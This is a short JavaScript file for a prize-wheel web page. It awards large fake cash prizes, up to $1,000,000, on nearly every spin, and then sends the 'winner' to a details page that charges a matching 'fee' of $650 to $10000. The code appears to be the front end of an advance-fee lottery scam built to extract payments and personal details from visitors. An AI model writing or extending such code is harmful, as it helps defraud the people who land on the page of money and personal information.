const prizes = [
    "$50,000.00", "$100,000.00", "$125,000.00", "$150,000.00", "$175,000.00",
    "$200,000.00", "$250,000.00", "$300,000.00", "$450,000.00", "$500,000.00",
    "$600,000.00", "$800,000.00", "$850,000.00", "$900,000.00", "$1,000,000.00", "Empty"
];

const fees = {
    "$50,000.00": "$650", "$100,000.00": "$1000", "$125,000.00": "$1250", 
    "$150,000.00": "$1500", "$175,000.00": "$1750", "$200,000.00": "$2000",
    "$250,000.00": "$2500", "$300,000.00": "$3000", "$450,000.00": "$4500",
    "$500,000.00": "$5000", "$600,000.00": "$6000", "$800,000.00": "$8000",
    "$850,000.00": "$8500", "$900,000.00": "$9000", "$1,000,000.00": "$10000"
};

let spinsLeft = 3;

document.getElementById("spin-button").addEventListener("click", () => {
    if (spinsLeft > 0) {
        const wheel = document.getElementById("wheel");
        const randomAngle = Math.floor(Math.random() * 360) + 720; // Multiple spins
        wheel.style.transform = `rotate(${randomAngle}deg)`;

        setTimeout(() => {
            const prizeIndex = Math.floor(randomAngle % 360 / (360 / prizes.length));
            const prize = prizes[prizeIndex];
            
            if (prize === "Empty") {
                spinsLeft--;
                alert(`Try Again! You have ${spinsLeft} spin(s) left.`);
            } else {
                alert(`Congratulations! You won ${prize}.`);
                collectUserDetails(prize);
            }
        }, 3000);
    } else {
        alert("No spins left!");
    }
});

function collectUserDetails(prize) {
    // Redirect to a form or display a modal for details
    const fee = fees[prize];
    window.location.href = `winners.html?prize=${prize}&fee=${fee}`;
}
